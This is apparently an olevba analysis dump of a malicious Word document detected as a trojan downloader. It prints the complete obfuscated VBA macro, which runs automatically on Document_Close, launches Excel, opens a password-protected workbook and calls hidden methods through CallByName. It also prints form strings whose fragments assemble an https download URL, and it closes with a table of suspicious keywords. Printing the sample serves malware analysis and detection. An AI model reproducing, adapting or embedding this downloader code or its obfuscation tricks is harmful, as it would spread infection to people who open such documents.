olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan-Downloader.MSOffice.Agent.gen-409ed829f19024045d26cc5d3a06e15a097605e13ba938875eca054a7a4a30b1
Type: OpenXML
WARNING  For now, VBA stomping cannot be detected for files in memory
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: word/vbaProject.bin - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public b9, way1l, m1l, xmmog, uf2
Sub Document_Close()
h4ibi
jgac8 = Application.Options.ShowReadabilityStatistics
If jay > 743 Then
prcb = Application.Options.EnableHangulHanjaRecentOrdering
jay = prcb
End If
End Sub
Sub h4ibi()
On Error Resume Next
Application.DisplayAlerts = False
Err.Number = 0
nl = Application.Options.MultipleWordConversionsMode
If jgac8 > 2751 Then
gi9sj = Application.Options.RevisedLinesMark
jgac8 = gi9sj
End If
UserForm2.ComboBox1.ListIndex = 2
Dim xo
Set xo = CreateObject(UserForm1.ComboBox1)
xo.DisplayAlerts = False
nkrsn = "visible"
m7ae7 = "OnTime"
yw = Application.Options.UseCharacterUnit
If nl > 2443 Then
n2w2p = Application.Options.Creator
nl = n2w2p
End If
Dim kxn3n
kse4 = 1
fmwo = 1
While kse4 <> 0 And fmwo < 3
Set kxn3n = xo.Workbooks.Open(FileName:=UserForm2.ComboBox1, Password:=UserForm1.ComboBox2)
kse4 = Err.Number
fmwo = fmwo + 1
Wend
If kse4 <> 0 Then
bag3 = CallByName(Application, nkrsn, 2)
fjgl = Application.Options.MatchFuzzyByte
If yw > 285 Then
rut38 = Application.Options.DisableFeaturesIntroducedAfterbyDefault
yw = rut38
End If
If bag3 = True Then
Set iqt1 = CreateObject(UserForm1.ComboBox3)
iqt1.Documents.Open ActiveDocument.FullName, ReadOnly:=True
iqt1.Run "ThisDocument." & "h4ibi"
wat = Application.Options.GridDistanceHorizontal
If fjgl > 3669 Then
p2 = Application.Options.RTFInClipboard
fjgl = p2
End If
Else
UserForm1.ComboBox4 = UserForm1.ComboBox4 & "0"
kfz5 = Application.Options.AutoFormatApplyOtherParas
If wat > 2697 Then
zrspp = Application.Options.SmartParaSelection
wat = zrspp
End If
uy = Application.Options.UpdateLinksAtOpen
If kfz5 > 1153 Then
jhk95 = Application.Options.HangulHanjaFastConversion
kfz5 = jhk95
End If
vj = Application.Options.MultipleWordConversionsMode
If uy > 484 Then
aicc = Application.Options.ArabicNumeral
uy = aicc
End If
Application.OnTime Now + TimeSerial(0, 0, 20), "ThisDocument." & "h4ibi"
End If
xo.Quit
Exit Sub
End If
Dim a39wq
Set a39wq = xo.sheets(1)
f5 = "'"
onsib = xo.sheets(2).Cells(217, 3).Value
way1l = xo.sheets(3).Cells(54, 44).Value
au8 = Application.Options.MatchFuzzyOldKana
If vj > 3013 Then
f57e = Application.Options.AutoFormatApplyLists
vj = f57e
End If
gl0 = Application.Options.VisualSelection
If au8 > 2569 Then
st2x6 = Application.Options.TabIndentKey
au8 = st2x6
End If
dqv4 = xo.sheets(3).Cells(157, 21).Value
x9v95 = xo.sheets(2).Cells(98, 38).Value
E = Application.Options.InsertedTextColor
If gl0 > 4653 Then
qk = Application.Options.SuggestSpellingCorrections
gl0 = qk
End If
mgk = xo.sheets(1).Cells(61, 20).Value
r5tve = xo.sheets(3).Cells(158, 15).Value
uf2 = xo.sheets(3).Cells(37, 50).Value
ioxx = a39wq.Cells(227, 34).Value
k1 = a39wq.Cells(238, 8).Value
komw = xo.sheets(2).Cells(7, 9).Value
byie = xo.sheets(2).Cells(9, 9).Value
mo4 = xo.sheets(2).Cells(187, 8).Value
dr6db = xo.sheets(3).Cells(187, 15).Value
b2e9k = xo.sheets(2).Cells(87, 8).Value
d721 = Application.Options.AutoFormatAsYouTypeApplyHeadings
If b6we > 3589 Then
g2y4d = Application.Options.AutoFormatReplaceFractions
b6we = g2y4d
b6we = Application.Options.DefaultBorderColor
End If
m5 = Application.Options.PasteMergeFromPPT
If d721 > 3863 Then
a63z = Application.CentimetersToPoints(80)
d721 = a63z
End If
cfvbd = xo.sheets(3).Cells(179, 31).Value
o75as = xo.sheets(3).Cells(111, 2).Value
cm1r8 = xo.sheets(2).Cells(80, 13).Value
bd = Application.Options.BackgroundSave
kx = xo.sheets(2).Cells(247, 50).Value
gv1 = a39wq.Cells(108, 18).Value
ym = xo.sheets(3).Cells(99, 21).Value
ld = Application.Options.DisableFeaturesIntroducedAfterbyDefault
If bd > 4018 Then
bilx = Application.Options.AnimateScreenMovements
bd = bilx
End If
fgao = xo.sheets(3).Cells(102, 45).Value
q9mn0 = xo.sheets(3).Cells(24, 31).Value
b9 = xo.sheets(3).Cells(67, 48).Value
b4tn = xo.sheets(3).Cells(82, 13).Value
zbj = xo.sheets(1).Cells(48, 16).Value
tw = xo.sheets(2).Cells(156, 20).Value
f3f = CallByName(xo, komw, 2)
Set ieid = UserForm1.Controls.Add("Forms.ComboBox.1")
ieid.Value = onsib & f3f & b4tn
Set e86yw = UserForm1.Controls.Add("Forms.ComboBox.1")
e86yw.Value = r5tve
CallByName CreateObject(fgao), dqv4, 1, ieid, o75as, e86yw
Set nd8yh = CreateObject(kx)
dac8 = Application.Options.DefaultBorderColor
If ld > 2867 Then
hf7o = Application.Options.MatchFuzzyDash
ld = hf7o
End If
Set q5z9c = CallByName(nd8yh, mo4, 2)
Set t8 = CallByName(q5z9c, x9v95, 1)
Set tw = CallByName(nd8yh, tw, 2)
Set xmmog = nd8yh
Set dr6db = CallByName(tw, dr6db, 2)
Set gv1 = CallByName(dr6db, gv1, 2)
Set jay = CallByName(gv1, mgk, 1, ioxx)
Set b9 = CallByName(jay, b9, 2)
byie = CallByName(b9, byie, 2)
CallByName b9, k1, 1, 1, byie
Set m1l = UserForm1.Controls.Add("Forms.ComboBox.1")
m1l.Value = ym & cfvbd
UserForm3.ComboBox1 = q9mn0
m1l.Value = cm1r8
UserForm4.ComboBox1 = UserForm3.ComboBox1
UserForm3.ComboBox1 = byie
nd8yh = Nothing
dlhl = Application.Options.ShortMenuNames
If dac8 > 4792 Then
i657b = Application.Options.AutoFormatAsYouTypeApplyTables
dac8 = i657b
End If
dd = Application.Options.SuggestSpellingCorrections
If dlhl > 4557 Then
sh7ir = Application.Options.SaveNormalPrompt
dlhl = sh7ir
End If
kxn3n = Nothing
a39wq = Nothing
q5z9c = Nothing
t8 = Nothing
tw = Nothing
dr6db = Nothing
gv1 = Nothing
jay = Nothing
b9 = Nothing
ij = Application.ProductCode
If dd > 770 Then
ui = Application.CentimetersToPoints(95)
dd = ui
End If
xmmog = Nothing
DoEvents
CallByName xo, b2e9k, 1
xo = Nothing
DoEvents
ewll = Application.ProductCode
If ij > 567 Then
m6 = ActiveDocument.Name
ij = m6
End If
CallByName CreateObject(fgao), zbj, 1, onsib & f3f & b4tn
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm2.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
 

obf7b = Application.Options.BackgroundSave

If zfivb > 2001 Then


jiz = Application.Options.PromptUpdateStyle

zfivb = jiz

End If


c0 = Application.Options.DefaultBorderColorIndex

If obf7b > 22 Then


bbpa = Application.Options.IgnoreMixedDigits

obf7b = bbpa

End If

 On Error GoTo ErrorHandler

 fm6j1 = UserForm2.Controls.Count - 1
 
 If Len(UserForm1.ComboBox4) > 10 Then
 fm6j1 = fm6j1 * 2
 End If

qbm = Application.Options.AutoFormatAsYouTypeReplaceFarEastDashes

If c0 > 2247 Then


zv = Application.Options.MapPaperSize

c0 = zv

End If


 hz = ""
 For zfivb = 1 To fm6j1 Step 2
 hz = hz & UserForm2.Controls.Item(zfivb)
 Next

 ComboBox1.AddItem "cf"
 ComboBox1.AddItem "ue84q"
 ComboBox1.AddItem hz
 ComboBox1.AddItem "ay"
 
 Exit Sub
 
ErrorHandler:

d9ao = Application.Options.AllowCompoundNounProcessing

If qbm > 743 Then


fx71h = Application.CapsLock

qbm = fx71h

End If

 
 
 
End Sub

-------------------------------------------------------------------------------
VBA MACRO UserForm3.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()
 CallByName ActiveDocument.b9, ActiveDocument.way1l, VbMethod, ActiveDocument.m1l
End Sub

 
-------------------------------------------------------------------------------
VBA MACRO UserForm4.frm 
in file: word/vbaProject.bin - OLE stream: 'VBA/UserForm4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub UserForm_Initialize()

ghmo = Application.Options.ArabicNumeral


by98f = Application.Options.SmartCutPaste

If ghmo > 572 Then


oa = Application.Caption

ghmo = oa

End If

 CallByName ActiveDocument.xmmog, ActiveDocument.uf2, VbMethod, ActiveDocument.m1l
End Sub

 
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
excel.application
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i5x0wbqe81s
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
word.application
-------------------------------------------------------------------------------
VBA FORM STRING IN 'word/vbaProject.bin' - OLE stream: 'UserForm2/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
TahomaQ
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'excel.application'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'i5x0wbqe81s'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'word.application'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'0'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox2'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'http'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox3'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'XI'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox4'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b's://'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox5'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Zyn'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox6'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'heav'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox7'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'Rwl'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox8'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'enly'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox9'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'5X'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox10'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'gem.'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox11'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'xS'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox12'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'com/'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox13'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'BWj'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox14'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'11.p'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox15'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'eUY'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox16'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'hp'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox17'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'OP'
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
-------------------------------------------------------------------------------
VBA FORM Variable "b'ComboBox1'" IN 'word/vbaProject.bin' - OLE stream: 'UserForm4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b''
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|CreateObject        |May create an OLE object                     |
|Suspicious|CallByName          |May attempt to obfuscate malicious function  |
|          |                    |calls                                        |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

